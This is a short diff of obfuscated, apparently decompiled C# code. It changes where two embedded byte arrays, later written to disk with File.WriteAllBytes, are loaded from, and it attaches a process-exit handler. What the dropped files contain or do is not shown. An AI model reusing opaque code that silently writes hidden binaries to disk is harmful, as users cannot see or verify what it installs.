@@ -28,8 +28,8 @@ internal class _AeMKsR1PsUj3nMvFNJ8PA27BYIO
 				Console.WriteLine("Old lib is in use...");
 			}
 		}
-		File.WriteAllBytes(_AeMKsR1PsUj3nMvFNJ8PA27BYIO._GApuxDco3FAKbIkPXnHBxsWFEou, _VIgCTVMa1A4g21SK8I7wH9AJhr8A._zbwBPvIMxddujLrnbDDa5hmqEzo);
-		File.WriteAllBytes(_AeMKsR1PsUj3nMvFNJ8PA27BYIO._pU9IrCjrnvlduh3CLjorrSfqFdo, _VIgCTVMa1A4g21SK8I7wH9AJhr8A._eiIGyc5VbJc9a14Nr8WuWRrNxog);
+		File.WriteAllBytes(_AeMKsR1PsUj3nMvFNJ8PA27BYIO._GApuxDco3FAKbIkPXnHBxsWFEou, Resources._zbwBPvIMxddujLrnbDDa5hmqEzo);
+		File.WriteAllBytes(_AeMKsR1PsUj3nMvFNJ8PA27BYIO._pU9IrCjrnvlduh3CLjorrSfqFdo, Resources._eiIGyc5VbJc9a14Nr8WuWRrNxog);
 		AppDomain.CurrentDomain.ProcessExit += _AeMKsR1PsUj3nMvFNJ8PA27BYIO._iPfB1peMqsHMPW4BFgwB3Xlp6lt;
 	}
 
